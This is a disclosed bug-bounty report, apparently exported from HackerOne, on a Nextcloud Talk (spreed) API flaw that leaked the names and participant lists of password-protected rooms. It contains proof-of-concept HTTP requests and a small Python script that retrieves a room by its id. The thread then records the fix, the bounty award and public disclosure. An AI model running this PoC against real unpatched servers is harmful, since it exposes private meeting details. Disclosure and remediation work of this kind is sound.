{"id":428010,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjgwMTA=","url":"https://hackerone.com/reports/428010","title":"Talk / spreed: Disclosure of Room names and participants for password protected rooms","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-10-24T14:31:02.225Z","submitted_at":"2018-10-24T14:31:02.225Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"foobar7","url":"/foobar7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-17T14:22:58.001Z","bug_reporter_agreed_on_going_public_at":"2019-04-17T14:22:57.947Z","team_member_agreed_on_going_public_at":"2019-04-12T05:57:53.734Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CVSS\n----\n\n5.3 Medium [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) (CVSS isn't always as fine-grained as I'd like; personally, I would rate the issue somewhere between low and medium)\n\nDescription\n-----------\n\nThe API of the official [spreed/talk](https://github.com/nextcloud/spreed) extension reveals potentially sensitive information such as room names or participants of password-protected rooms to users without the password.\n\nAn account is not required to access room names.\n\nPOC: Shared, password protected room leaks room name to unauthenticated attackers\n---------\n\nPrerequisite: Create a room, click on \"Share link\", and enable password protection.\n\nAs unauthenticated user, visit the login page to get cookies and a CSRF token. \n\nThe unauthenticated user cannot access `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room` or `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/iu86mvxv/participant` (\"Current user is not logged in\"). However, they can access specific rooms based on the room id:\n\n    GET /nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/bk9we2vg HTTP/1.1\n    Host: 192.168.0.103\n    [...]\n    requesttoken: [...]\n    [...]\n    Cookie: [...]\n    Connection: close\n\n    HTTP/1.1 200 OK\n    {\"ocs\":{\"meta\":{\"status\":\"ok\",\"statuscode\":200,\"message\":\"OK\"},\"data\":{\"id\":13,\"token\":\"bk9we2vg\",\"type\":3,\"name\":\"supersecret\",\"displayName\":\"supersecret\",\"objectType\":\"\",\"objectId\":\"\",\"participantType\":4,\"participantInCall\":0,\"participantFlags\":0,\"count\":1,\"hasPassword\":true,\"hasCall\":false,\"lastActivity\":1540389616,\"unreadMessages\":0,\"unreadMention\":false,\"isFavorite\":false,\"lastPing\":0,\"sessionId\":\"0\",\"participants\":[],\"numGuests\":0,\"guestList\":\"\",\"lastMessage\":[]}}}\n\nDespite being password protected, the room leaked the room name - which might contain sensitive information - to unauthenticated attackers.\n\nPOC: Shared, password protected room leaks participans to authenticated attackers\n--------------------\n\nPrerequisite: Create a room, click on \"Share link\", and enable password protection.\n\nAs an authenticated user, issue the following request:\n\n    GET /nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/bk9we2vg/participants HTTP/1.1\n    Host: 192.168.0.103\n    [...]\n    requesttoken: [...]\n    [...]\n    Cookie: [...]\n    Connection: close\n\n    HTTP/1.1 200 OK\n    {\"ocs\":{\"meta\":{\"status\":\"ok\",\"statuscode\":200,\"message\":\"OK\"},\"data\":[{\"inCall\":0,\"lastPing\":1540389861,\"sessionId\":\"hnHuuwybsX6r65fbWFpwqvjZ+R15kumbONTr+ynIO5yu6TpDdPzDXov6+l3H2PkKX7X9FIC4BqAHBoZ\\/Ath\\/Fqjg9ljuj7smGUyf\\/1Z8B\\/yw9kotgZd4rM00OOaB2s+8Lph5zizgp7PoHiCvKTw2azAFIWBhLSe9fXQ9sdxzSMYSLAoYCaObU394OQO3ITJVjDQZQ1VOUSx+7dDPI1ycIZVTR\\/tOSXg7tfHCigOvetJkRxURCD3V80rdRR2n9IK\",\"participantType\":1,\"userId\":\"admin\",\"displayName\":\"admin\"}]}}\n\nDespite being password protected, the room leaked the participant list to an authenticated attacker. From what I can tell, `sessionId` should not leak either, but isn't useful for an attacker.\n\nSolution\n--------\n\nThe information should only be displayed to users that have authenticated themselves with the correct password for the room.\n\n## Impact\n\nDisclosure of Room names and participants for password protected rooms to unauthenticated or authenticated users without password.","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-12T05:57:53.794Z","allow_singular_disclosure_after":-76323693.92528461,"singular_disclosure_allowed":true,"vote_count":13,"voters":["rootz491","pomme","dhakal_ananda","ali","eveeez","an0nym0us","cryptographer","bgz0x","kingshish","rage_destroyer","and 3 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":14804,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/spreed","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3526659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2018-10-24T14:31:05.511Z","updated_at":"2018-10-24T14:31:05.511Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3526739,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a quick python script to easier reproduce the first POC:\n\n    import sys\n    import re\n    import argparse\n    import requests # requires requests lib\n\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"url\", help=\"base url to vulnerable site (eg http://example.com/nextcloud)\")\n    parser.add_argument(\"roomid\", help=\"id of password protected, shared room\")\n    args = parser.parse_args()\n\n    url = args.url.strip(\"/\")\n    roomid = args.roomid\n\n    def getCSRFToken(requestSession, url):\n        return re.search(\"\u003chead data-requesttoken=\\\"(.*?)\\\"\u003e\", requestSession.get(url).text, re.DOTALL).group(1)\n        \n    def get(url, csrfToken):\n        headers = {'requesttoken': csrfToken}\n        return requestSession.get(url, headers=headers).text\n\n    requestSession = requests.session()\n\n    csrfToken = getCSRFToken(requestSession, url + \"/index.php/login\")\n    print get(url + \"/ocs/v2.php/apps/spreed/api/v1/room/\" + roomid, csrfToken)","automated_response":false,"created_at":"2018-10-24T14:52:34.776Z","updated_at":"2018-10-24T14:52:34.776Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3531250,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @foobar7 \n\nThanks for taking a look at more of our code.\nI'll try to reproduce this (thanks for the POC code that should make it easier) and talk to our engineers working on the spreed app.\n\nI'll get back to you!\n\nCheers,\n--Roeland","automated_response":false,"created_at":"2018-10-25T10:27:33.821Z","updated_at":"2018-10-25T10:27:33.821Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3531370,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2018-10-25T11:24:59.358Z","updated_at":"2018-10-25T11:24:59.358Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3985595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rullzer,\n\nit's been a while, so I thought I'd ask for an update. Is there an ETA on a fix for this issue? \n\nBest,\nFoobar7","automated_response":false,"created_at":"2019-01-16T08:45:44.852Z","updated_at":"2019-01-16T08:45:44.852Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3986247,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, yes has been a while. It will be part of the next feature release at least.\nWe have to check if we can backport it without breaking all our mobile apps.\nIf that is possible we will also make the patch available on all still supported talk versions.","automated_response":false,"created_at":"2019-01-16T10:37:51.913Z","updated_at":"2019-01-16T10:37:51.913Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4071082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PR is at https://github.com/nextcloud/spreed/pull/1502\n\nIt breaks the Android app at least, the iOS app does not allow joining public rooms via link atm. We will check if the fix on android can be backported easily, in which case we would also backport this to Talk 5 / Nextcloud 15.","automated_response":false,"created_at":"2019-01-31T14:58:57.691Z","updated_at":"2019-01-31T14:58:57.691Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4076132,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nickvergessen I didn't test if this breaks anything else, but security-wise the fix looks good to me! Neither problem can be reproduced anymore, and I wasn't able to find a bypass either.","automated_response":false,"created_at":"2019-02-01T08:21:39.090Z","updated_at":"2019-02-01T08:21:39.090Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4185024,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This will be fixed in the next major Talk release","automated_response":false,"created_at":"2019-02-21T09:32:14.999Z","updated_at":"2019-02-21T09:32:14.999Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"foobar7","url":"/foobar7"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4267299,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nickvergessen ,\n\ngreat, thanks! \n\nIs this eligible for a bounty?\n\nBest,\nFoobar7","automated_response":false,"created_at":"2019-03-06T11:43:58.707Z","updated_at":"2019-03-06T11:43:58.707Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4544450,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"While the behaviour is quite bad and not intended, you still need to guess the token. So we agreed on our minimum bounty.","automated_response":false,"created_at":"2019-04-12T05:56:38.927Z","updated_at":"2019-04-12T05:56:38.927Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"foobar7","url":"/foobar7"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4544452,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","automated_response":false,"created_at":"2019-04-12T05:57:00.261Z","updated_at":"2019-04-12T05:57:00.261Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"reporter":{"username":"foobar7","url":"/foobar7"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4544453,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-12T05:57:53.760Z","updated_at":"2019-04-12T05:57:53.760Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4584335,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-17T14:22:57.969Z","updated_at":"2019-04-17T14:22:57.969Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4584336,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-17T14:22:58.024Z","updated_at":"2019-04-17T14:22:58.024Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}